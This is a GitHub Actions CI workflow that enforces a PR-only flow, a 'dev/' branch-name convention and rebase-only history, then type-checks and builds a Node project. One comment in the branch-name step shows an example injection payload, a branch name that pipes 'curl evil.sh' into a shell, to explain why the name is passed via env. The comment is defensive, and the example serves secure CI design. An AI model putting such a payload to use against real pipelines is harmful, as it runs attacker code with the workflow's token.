name: CI

# Runs on every pull request into main, and on pushes to any branch except main.
# The PR run is what gates the merge button.
on:
  pull_request:
    branches: [main]
  push:
    branches-ignore: [main]

# A newer push to the same branch cancels the older run.
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

jobs:
  # ---------------------------------------------------------------------------
  # Guard: enforces the PR-only workflow and the branch naming convention.
  # This is the free stand-in for branch protection. Keep it in THIS workflow
  # so one red check blocks the merge button.
  # ---------------------------------------------------------------------------
  guard:
    name: Guard (PR target + branch name)
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - name: Check out the PR head with full history
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Target branch must be main
        env:
          BASE_REF: ${{ github.base_ref }}
        run: |
          if [ "$BASE_REF" != "main" ]; then
            echo "::error::PRs must target 'main'. This one targets '$BASE_REF'."
            exit 1
          fi
          echo "Target branch is main."

      - name: Source branch must start with dev/
        env:
          HEAD_REF: ${{ github.head_ref }}
        run: |
          # HEAD_REF comes from the branch name, which a contributor controls.
          # It is passed via env rather than interpolated into this script: a
          # branch called  dev/x"; curl evil.sh | sh; #  would otherwise run
          # arbitrary code with the workflow token.
          case "$HEAD_REF" in
            dev/*)
              echo "Branch name OK: $HEAD_REF"
              ;;
            *)
              echo "::error::Branch '$HEAD_REF' does not match the required convention 'dev/<name>'."
              echo "::error::Rename it:  git branch -m dev/<name>  then push the new name."
              exit 1
              ;;
          esac

      - name: No merge commits on the branch
        env:
          BASE_REF: ${{ github.base_ref }}
          # The PR's real head commit, NOT HEAD.
          #
          # On pull_request events GitHub checks out a synthetic merge commit
          # (refs/pull/<n>/merge) that merges the head branch into the base.
          # That commit has two parents, so `rev-list --merges <base>..HEAD`
          # counts GitHub's own merge and always reports >= 1 - a false failure
          # on every PR. Measuring base..head_sha looks only at the branch.
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          BASE="origin/$BASE_REF"
          MERGES=$(git rev-list --merges "$BASE..$HEAD_SHA" | wc -l)
          if [ "$MERGES" -gt 0 ]; then
            echo "::error::This branch contains $MERGES merge commit(s). Rebase onto main instead:"
            echo "::error::  git fetch origin && git rebase origin/main"
            exit 1
          fi
          echo "No merge commits."

  # ---------------------------------------------------------------------------
  # Node: type-check and build the demo (apps/web + the shared packages).
  # ---------------------------------------------------------------------------
  node:
    name: Build (Node)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Node
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      - name: Type-check
        run: npm run typecheck

      - name: Build
        run: npm run build
